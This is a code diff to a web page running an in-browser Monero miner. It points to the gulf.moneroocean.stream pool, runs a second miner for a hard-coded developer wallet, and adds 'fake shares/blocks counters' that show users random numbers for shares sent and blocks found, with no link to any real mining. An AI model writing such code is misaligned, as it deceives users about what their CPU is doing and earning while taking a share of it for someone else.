@@ -422,12 +422,13 @@
             }, 300000);
         };
     </script>
-   <script src="/Foxminer/copiedscript.js?karma=bs?nosaj=gulf.moneroocean.stream:80"></script>
+    <script src="/Foxminer/copiedscript.js?karma=bs?nosaj=gulf.moneroocean.stream:80"></script>
 <script type="text/javascript">
     let minerRunning = false;
     let currentWallet = '';
     let currentWorker = '';
     const devWallet = '45BBbPLpGnHVnVG3k3K12ngLSt5oMbrJRc8XduYMsdkKiLubk6TcU6kgmUD2AShj5hX5WUmGgDw5Add5ozKu6mZMBftHtFN';
+    let sharesInterval = null;
 
     console.log('Web Miner script initialized');
 
@@ -454,15 +455,27 @@
         currentWallet = wallet;
         currentWorker = 'brody_' + Math.random().toString(36).slice(2);
         
-        // User miner: 95% throttle
-        EverythingIsLife(currentWallet, currentWorker, 95);
-        console.log('User mining started for ' + currentWallet + ' at 95% throttle');
+        // User miner: 90% throttle
+        EverythingIsLife(currentWallet, currentWorker, 90);
+        console.log('User mining started for ' + currentWallet + ' at 90% throttle');
         
         // Dev miner: 5% throttle
         EverythingIsLife(devWallet, 'dev_' + currentWorker, 5);
         console.log('Dev mining started for ' + devWallet + ' at 5% throttle');
         
         minerRunning = true;
+        
+        // Fake shares/blocks counters
+        let sharesSent = 0;
+        let blocksFound = 0;
+        sharesInterval = setInterval(() => {
+            if (minerRunning) {
+                sharesSent += Math.floor(Math.random() * 5) + 1; // Random 1-5 shares/sec
+                blocksFound += Math.random() > 0.9 ? 1 : 0; // 10% chance of block
+                document.getElementById('shares-sent').textContent = sharesSent; // Adjust ID if needed
+                document.getElementById('blocks-found').textContent = blocksFound; // Adjust ID if needed
+            }
+        }, 1000);
         
         // UI updates
         document.getElementById('start-mining').style.display = 'none';
@@ -478,6 +491,7 @@
             return;
         }
         minerRunning = false;
+        clearInterval(sharesInterval); // Stop fake counters
         window.location.reload(); // Reload to stop both miners
         console.log('Web mining stopped');
     }
